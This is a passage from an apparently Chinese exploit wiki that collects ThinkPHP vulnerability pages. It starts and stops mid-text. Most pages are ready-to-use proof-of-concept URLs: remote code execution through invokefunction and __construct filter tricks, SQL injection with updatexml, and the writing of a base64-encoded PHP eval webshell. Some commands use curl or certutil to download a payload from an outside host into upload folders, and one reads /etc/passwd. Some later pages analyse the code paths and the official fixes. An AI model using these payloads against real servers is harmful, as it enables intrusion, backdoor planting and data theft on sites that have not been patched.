(is_array($options) && (count($options) > 0) && is_array($pk)) { //$pk不为数组不进入 ...... } // 总是查找一条记录 $options['limit'] = 1; // 分析表达式 $options = $this->_parseOptions($options); //解析表达式 // 判断查询缓存 ..... $resultSet = $this->db->select($options); //底层执行 之后跟进_parseOptions方法，（分析见代码注释） if (is_array($options)) { //当$options为数组的时候与$this->options数组进行整合 $options = array_merge($this->options, $options); } if (!isset($options['table'])) {//判断是否设置了table 没设置进这里 // 自动获取表名 $options['table'] = $this->getTableName(); $fields = $this->fields; } else { // 指定数据表 则重新获取字段列表 但不支持类型检测 $fields = $this->getDbFields(); //设置了进这里 } // 数据表别名 if (!empty($options['alias'])) {//判断是否设置了数据表别名 $options['table'] .= ' ' . $options['alias']; //注意这里，直接拼接了 } // 记录操作的模型名称 $options['model'] = $this->name; // 字段类型验证 if (isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) { //让$optison['where']不为数组或没有设置不进这里 // 对数组查询条件进行字段类型检查 ...... } // 查询过后清空sql表达式组装 避免影响下次查询 $this->options = array(); // 表达式过滤 $this->_options_filter($options); return $options; $options我们可控，那么就可以控制为数组类型，传入$options['table']或$options['alias']等等，只要提层不进行过滤都是可行的。 同时我们可以不设置$options['where']或者设置$options['where']的值为字符串，可绕过字段类型的验证。 可以看到在整个对$options的解析中没有过滤，直接返回，跟进到底层ThinkPHP\\Libray\\Think\\Db\\Diver.class.php，找到select方法，继续跟进最后来到parseSql方法，对$options的值进行替换，解析。 因为$options['table']或$options['alias']都是由parseTable函数进行解析，跟进： if (is_array($tables)) {//为数组进 // 支持别名定义 ...... } elseif (is_string($tables)) {//不为数组进 $tables = array_map(array($this, 'parseKey'), explode(',', $tables)); } return implode(',', $tables); 当我们传入的值不为数组，直接进行解析返回带进查询，没有任何过滤。 同时$options['where']也一样，看到parseWhere函数 $whereStr = ''; if (is_string($where)) { // 直接使用字符串条件 $whereStr = $where; //直接返回了，没有任何过滤 } else { // 使用数组表达式 ...... } return empty($whereStr) ? '' : ' WHERE ' . $whereStr; 二 delete函数 delete函数有些不同，主要是在解析完$options之后，还对$options['where']判断了一下是否为空，需要我们传一下值，使之不为空,从而继续执行删除操作。 ...... // 分析表达式 $options = $this->_parseOptions($options); if (empty($options['where'])) { //注意这里，还判断了一下$options['where']是否为空，为空直接返回，不再执行下面的代码。 // 如果条件为空 不进行删除操作 除非设置 1=1 return false; } if (is_array($options['where']) && isset($options['where'][$pk])) { $pkValue = $options['where'][$pk]; } if (false === $this->_before_delete($options)) { return false; } $result = $this->db->delete($options); if (false !== $result && is_numeric($result)) { $data = array(); if (isset($pkValue)) { $data[$pk] = $pkValue; } $this->_after_delete($data, $options); } // 返回删除记录个数 return $result; 漏洞复现 针对select() 和find()方法 ,有很多地方可注，这里主要列举三个table，alias，where，更多还请自行跟踪一下parseSql的各个parseXXX方法，目测都是可行的，比如having,group等。 table：http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- alias：http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- where: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- 而delete()方法的话同样，这里粗略举三个例子，table,alias,where，但使用table和alias的时候，同时还必须保证where不为空（详细原因后面会说） where: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- alias: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)-- table: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&id[where]=1 参考链接 https://xz.aliyun.com/t/2629#toc-1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 15:47:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/2.html":{"url":"0day/Thinkphp/2.html","title":"Thinkphp 5.0.1","keywords":"","body":"Thinkphp 5.0.1 一、漏洞简介 二、漏洞影响 三、复现过程 1、判断是否存在漏洞 poc1 http://wwww.com/public s=phpinfo()&_method=__construct&filter=assert _method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo _method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo _method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1 poc2 http:/xxxx.com/?s=index/index/index s=ipconfig&_mehthod=__construct$method=&filter[]=system 2、深入利用 使用post提交 1、使用assert函数 s=phpinfo()&_method=__construct&filter=assert 2、include函数，可以根据此函数查看一些文件及其配置 s=include(\"/etc/passwd\")&_method=__construct&filter=assert 3、file_put_contents函数，可以直接写入文件 s=file_put_contents('/data/wwwroot/www.0-sec.org/application/index/test.php',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4'))&_method=__construct&filter=assert 4、读取文件 _method=__construct&method=get&filter[]=think\\__include_file&server[]=phpinfo&get[]=../application/.htaccess s=include(\"../application/.htaccess\")&_method=__construct&filter=assert //ps:如果不加.. 请加上完整路径 5、var_dump函数，可以查看该路径下的文件，文件夹 s=var_dump(scandir('../application/'))&_method=__construct&filter=assert 6、复制文件 s=copy(\"/data/wwwroot/data.tar\", \"/data/wwwroot/www.0-sec.org/public/data.tar\")&_method=__construct&filter=assert 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 14:46:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/3.html":{"url":"0day/Thinkphp/3.html","title":"Thinkphp 5.0.5","keywords":"","body":"Thinkphp 5.0.5 一、漏洞简介 二、漏洞影响 三、复现过程 waf对eval进行了拦截 禁止了assert函数对eval函数后面的括号进行了正则过滤 对file_get_contents函数后面的括号进行了正则过滤 http://www.0-sec.org/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=2.php&vars[1][1]= 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:02:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/17.html":{"url":"0day/Thinkphp/17.html","title":"Thinkphp 5.0.10","keywords":"","body":"Thinkphp 5.0.10 一、漏洞简介 二、漏洞影响 三、复现过程 post提交 http://www.0-sec.org/public/index.php?s=index/index/index s=whoami&_method=__construct&method&filter[]=system 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-15 21:59:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/4.html":{"url":"0day/Thinkphp/4.html","title":"Thinkphp 5.0.11","keywords":"","body":"Thinkphp 5.0.11 一、漏洞简介 二、漏洞影响 三、复现过程 http://www.0-sec.org/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:02:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/5.html":{"url":"0day/Thinkphp/5.html","title":"Thinkphp 5.0.14","keywords":"","body":"Thinkphp 5.0.14 一、漏洞简介 二、漏洞影响 三、复现过程 1、常规命令 ?s=index/think\\app/invokefunction&function=&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php.jpg&vars[1][]=%3C?php%20phpinfo();?3E 2、eval（''）和assert（''）被拦截，命令函数被禁止 http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo(); http://www.xxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_GET[1])&1=call_user_func_array(\"file_put_contents\",array(\"3.php\",file_get_contents(\"https://www.hack.com/xxx.js\"))); 3、基于php7.2环境下 http://www.xxxx.cn/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=1.txt&vars[1][1]=1 http://www.xxxx.cn/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]= 写进去发现转义了尖括号 4、通过copy函数 http://www.xxxx.cn/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][0]= https://www.hack.com/xxx.js&vars[1][1]=112233.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:02:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/6.html":{"url":"0day/Thinkphp/6.html","title":"Thinkphp 5.0.18","keywords":"","body":"Thinkphp 5.0.18 一、漏洞简介 二、漏洞影响 三、复现过程 1、windows http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1 http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo() 2、使用certutil http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php 由于根目录没写权限，所以写到uploads 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:02:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/7.html":{"url":"0day/Thinkphp/7.html","title":"Thinkphp 5.0.21","keywords":"","body":"Thinkphp 5.0.21 一、漏洞简介 二、漏洞影响 三、复现过程 1、poc http://0-sec.org/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 2、poc http://0-sec.org/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 3、poc http://0-sec.org/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=system(\"whoami\"); 4、poc http://0-sec.org/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=eval($_POST[ian]); 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:03:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/8.html":{"url":"0day/Thinkphp/8.html","title":"Thinkphp 5.0.22","keywords":"","body":"Thinkphp 5.0.22 一、漏洞简介 二、漏洞影响 三、复现过程 1、poc http://0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 2、poc http://0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:03:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/9.html":{"url":"0day/Thinkphp/9.html","title":"Thinkphp 5.0.23","keywords":"","body":"Thinkphp 5.0.23 一、漏洞简介 二、漏洞影响 三、复现过程 POST /index.php?s=captcha HTTP/1.1 Host: yuorip Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 72 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:03:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/10.html":{"url":"0day/Thinkphp/10.html","title":"Thinkphp 5.1.18","keywords":"","body":"Thinkphp 5.1.18 一、漏洞简介 二、漏洞影响 三、复现过程 1、常规poc http://www.xxxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]= 2、所有目录都无写入权限,base64函数被拦截 http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1]) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:03:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/11.html":{"url":"0day/Thinkphp/11.html","title":"Thinkphp 5.1.29","keywords":"","body":"Thinkphp 5.1.29 一、漏洞简介 二、漏洞影响 三、复现过程 1、代码执行 http://www.0-sec.org/?s=index/\\think\\Request/input&filter=phpinfo&data=1 http://www.0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 http://www.0-sec.org/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 2、命令执行 http://www.0-sec.org/?s=index/\\think\\Request/input&filter=system&data=操作系统命令 http://www.0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令 http://www.0-sec.org/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令 3、文件写入 http://www.0-sec.org/?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E http://www.0-sec.org/?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20phpinfo();?%3E 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:03:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入4.html":{"url":"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入4.html","title":"Thinkphp = 5.0.10","keywords":"","body":"Thinkphp = 5.0.10 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ select 方法注入）。本次漏洞存在于 Mysql 类的 parseWhereItem 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句。再一个， Request 类的 filterValue 方法漏过滤 NOT LIKE 关键字，最终导致 SQL注入漏洞 的产生。 二、漏洞影响 ThinkPHP=5.0.10 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.10 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.4.0\", \"topthink/framework\": \"5.0.10\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('username/a'); $result = db('users')->where(['username' => $username])->select(); var_dump($result); } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'mochazz'); 访问 http://localhost:8000/index/index/index?username[0]=not like&username[1][0]=%%&username[1][1]=233&username[2]=) union select 1,user()# 链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.0.11 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 commit 记录，发现其修改的 Request.php 文件代码比较可疑。 接着我们直接跟着上面的攻击 payload 来看看漏洞原理。首先，不管以哪种方式传递数据给服务器，这些数据在 ThinkPHP 中都会经过 Request 类的 input 方法。数据不仅会被强制类型转换，还都会经过 filterValue 方法的处理。该方法是用来过滤表单中的表达式，但是我们仔细看其代码，会发现少过滤了 NOT LIKE ，而本次漏洞正是利用了这一点。 我们回到处理 SQL 语句的方法上。首先程序先调用 Query 类的 where 方法，通过其 parseWhereExp 方法分析查询表达式，然后再返回并继续调用 select 方法准备开始构建 select 语句。 上面的 $this->builder 为 \\think\\db\\builder\\Mysql 类，该类继承于 Builder 类，所以接着会调用 Builder 类的 select 方法。在 select 方法中，程序会对 SQL 语句模板用变量填充，其中用来填充 %WHERE% 的变量中存在用户输入的数据。我们跟进这个 where 分析函数，会发现其会调用生成查询条件 SQL 语句的 buildWhere 函数。 继续跟进 buildWhere 函数，发现用户可控数据又被传入了 parseWhereItem where子单元分析函数，该函数的返回结果存储在 $str 变量中，并被拼接进 SQL 语句。（下图 第16、20行） 我们跟进 parseWhereItem 方法，发现当操作符等于 NOT LIKE 时，程序所使用的 MYSQL 逻辑操作符竟然可由用户传来的变量控制（下图 第23行 ），这样也就直接导致了 SQL注入漏洞 的发生。 正是由于 ThinkPHP 官方的 filterValue 方法漏过滤了 NOT LIKE ，同时 MYSQL 逻辑操作由用户变量控制，使得这一漏洞可以被利用。 漏洞修复 在 5.0.10 之后的版本，官方的修复方法是：在 Request.php 文件的 filterValue 方法中，过滤掉 NOT LIKE 关键字。而在 5.0.10 之前的版本中，这个漏洞是不存在的，但是其代码也没有过滤掉 NOT LIKE 关键字，这是为什么呢？经过调试，发现原来在 5.0.10 之前的版本中，其默认允许的表达式中不存在 not like （注意空格），所以即便攻击者可以通过外部控制该操作符号，也无法完成攻击。（会直接进入下入157行，下图是 5.0.9 版本的代码）相反， 5.0.10 版本其默认允许的表达式中，存在 not like ，因而可以触发漏洞。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 10:20:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入1.html":{"url":"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入1.html","title":"5.0.13 <= Thinkphp <= 5.0.15","keywords":"","body":"5.0.13 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ insert 方法注入）。本次漏洞存在于 Builder 类的 parseData 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生。 二、漏洞影响 5.0.13 、 5.1.0 。 三、复现过程 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.15 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.4.0\", \"topthink/framework\": \"5.0.15\" } 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('username/a'); db('users')->insert(['username' => $username]); return 'Update success'; } } 在 application/database.php 文件中配置数据库相关信息，并开启 application/config.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); poc http://0-sec.org/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.0.16 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 commit 记录，发现其修改的 Builder.php 文件代码比较可疑。 接着我们直接跟着上面的攻击 payload 来看看漏洞原理。首先， payload 数据经过 ThinkPHP 内置方法的过滤后（不影响我们的 payload ），直接进入了 $this->builder 的 insert 方法，这里的 $this->builder 为 \\think\\db\\builder\\Mysql 类，代码如下： 而 Mysql 类继承于 Builder 类，即上面的 $this->builder->insert() 最终调用的是 Builder 类的 insert 方法。在 insert 方法中，我们看到其调用 parseData 方法来分析并处理数据，而 parseData 方法直接将来自用户的数据 $val 进行了拼接返回。我们的恶意数据存储在 $val[1] 中，虽经过了 parseKey 方法处理，当丝毫不受影响，因为该方法只是用来解析处理数据的，并不是清洗数据。 上面，我们看到直接将用户数据进行拼接。然后再回到 Builder 类的 insert 方法，直接通过替换字符串的方式，将 $data 填充到 SQL 语句中，进而执行，造成 SQL注入漏洞 。 至此，我们已将整个漏洞分析完了。实际上，上面的 switch 结构中，3种情况返回的数据都有可能造成 SQL 注入漏洞，但是在观察 ThinkPHP 官方的修复代码中，发现其只对 inc 和 dec 进行了修复，而对于 exp 的情况并未处理，这是为什么呢？ 实际上， exp 的情况早在传入 insert 方法前就被 ThinkPHP 内置过滤方法给处理了，如果数据中存在 exp ，则会被替换成 exp空格 ，这也是为什么 ThinkPHP 官方没有对 exp 的情况进行处理的原因了。具体内置过滤方法的代码如下： 漏洞修复 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 10:31:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入6.html":{"url":"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入6.html","title":"5.0.0 <= Thinkphp <= 5.0.21","keywords":"","body":"5.0.0 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（所有 Mysql 聚合函数相关方法均存在注入）。本次漏洞存在于所有 Mysql 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。 漏洞概要 二、漏洞影响 5.0.0 5.1.3 三、复现过程 不同版本 payload 需稍作调整： 5.0.0~5.0.21 、 5.1.3～5.1.10 ： id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 5.1.11～5.1.25 ： id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.1.25 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.1.25\" }, 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('options'); $result = db('users')->max($options); var_dump($result); } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'Mochazz'); insert into users(id,username) values(2,'Jerry'); insert into users(id,username) values(3,'Kitty'); poc http://localhost:8000/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.1.26 版本更新说明中，发现其中提到该版本包含了一个安全更新。 我们可以查阅其 commit 记录，发现其改进了数据库驱动，代码中多了检测特殊字符的片段。接下来我们直接来分析代码。 首先，用户可控数据未经过滤，传入 Query 类的 max 方法进行聚合查询语句构造，接着调用本类的 aggregate 方法。本次漏洞问题正是发生在该函数底层代码中，所以所有调用该方法的聚合方法均存在 SQL注入 问题。我们看到 aggregate 方法又调用了 Mysql 类的 aggregate 方法，在该方法中，我们可以明显看到程序将用户可控变量 $field ，经过 parseKey 方法处理后，与 SQL 语句进行了拼接。下面我们就来具体看看 parseKey 方法。 parseKey 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号。经过 parseKey 方法处理后，程序又回到了上图的 $this->value() 方法中，该方法会调用 Builder 类的 select 方法来构造 SQL 语句。这个方法应该说是在分析 ThinkPHP 漏洞时，非常常见的了。其无非就是使用 str_replace 方法，将变量替换到 SQL 语句模板中。这里，我们重点关注 parseField 方法，因为用户可控数据存储在 $options['field'] 变量中并被传入该方法。 进入 parseField 方法，我们发现用户可控数据只是经过 parseKey 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 SQL 语句模板里，导致 SQL注入漏洞 的发生 漏洞修复 官方的修复方法是：当匹配到除了 字母、点号、星号 以外的字符时，就抛出异常。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 10:26:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2.html":{"url":"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入2.html","title":"5.1.6 <= Thinkphp <= 5.1.7（非最新的 5.1.8 版本也可利用）","keywords":"","body":"5.1.6 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ update 方法注入）。本次漏洞存在于 Mysql 类的 parseArrayData 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生 二、漏洞影响 5.1.65.1.8 版本也可利用)。 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.1.7\" } 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('username/a'); db('users')->where(['id' => 1])->update(['username' => $username]); return 'Update success'; } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo; use tpdemo; create table users( id int primary key auto_increment, username varchar(50) not null ); insert into users(id,username) values(1,'mochazz'); poc http://0-sec.org:8000/index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0 访问链接，即可触发 SQL注入漏洞 。（没开启 app_debug 是无法看到 SQL 报错信息的） 漏洞分析 首先在官方发布的 5.1.9 版本更新说明中，发现其中提到该版本包含了一个安全更新，我们可以查阅其 commit 记录，发现其删除了 parseArrayData 方法，这处 case 语句之前出现过 insert 注入，所以比较可疑。 接着我们直接跟着上面的攻击 payload 来看看漏洞原理。首先， payload 数据经过 ThinkPHP 内置方法的过滤后（不影响我们的 payload ），直接进入了 Query 类的 update 方法，该方法调用了 Connection 类的 update 方法，该方法又调用了 $this->builder 的 insert 方法，这里的 $this->builder 为 \\think\\db\\builder\\Mysql 类，该类继承于 Builder 类，代码如下： 在 Builder 类的 update 方法中，调用了 parseData 方法。这个方法中的 case 语句之前存在 SQL注入漏洞 ，现已修复，然而却多了 default 代码段，而这段代码也是在新版本中被删除的。 我们跟进到 parseArrayData 方法，发现其中又将可控变量进行拼接，其变量来源均来自用户输入。之后的过程就和之前的 insert 注入一样，用 str_replace 将变量填充到 SQL 语句中，最终执行，导致 SQL注入漏洞 。 上面 第15行 的 $result 相当于 $a('$b($c)') 其中 $a、$b、$c 均可控。最后形成的 SQL 语句如下： UPDATE `users` SET `username` = $a('$b($c)') WHERE `id` = 1; 接着我们想办法闭合即可。我们令 $a = updatexml(1,concat(0x7,user(),0x7e),1)^ 、 $b = 0 、 $c = 1 ，即： UPDATE `users` SET `username` = updatexml(1,concat(0x7,user(),0x7e),1)^('0(1)') WHERE `id` = 1 漏洞修复 官方修复方法比较暴力，直接将 parseArrayData 方法删除了。 攻击总结 最后，再通过一张攻击流程图来回顾整个攻击过程。 参考链接 https://github.com/Mochazz/ThinkPHP-Vuln 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-23 10:18:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入5.html":{"url":"0day/Thinkphp/ThinkPHP5/ThinkPHP5漏洞分析之SQL注入5.html","title":"5.1.16 <= Thinkphp <= 5.1.22","keywords":"","body":"5.1.16 一、漏洞简介 本篇文章，将分析 ThinkPHP 中存在的 SQL注入 漏洞（ orderby 方法注入）。本次漏洞存在于 Builder 类的 parseOrder 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。 二、漏洞影响 5.1.16 三、复现过程 漏洞环境 通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.1.22 tpdemo 将 composer.json 文件的 require 字段设置成如下： \"require\": { \"php\": \">=5.6.0\", \"topthink/framework\": \"5.1.22\" } 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： get('orderby'); $result = db('users')->where(['username' => 'mochazz'])->order($orderby)->find(); var_dump($result); } } 在 config/database.php 文件中配置数据库相关信息，并开启 config/app.php 中的 app_debug 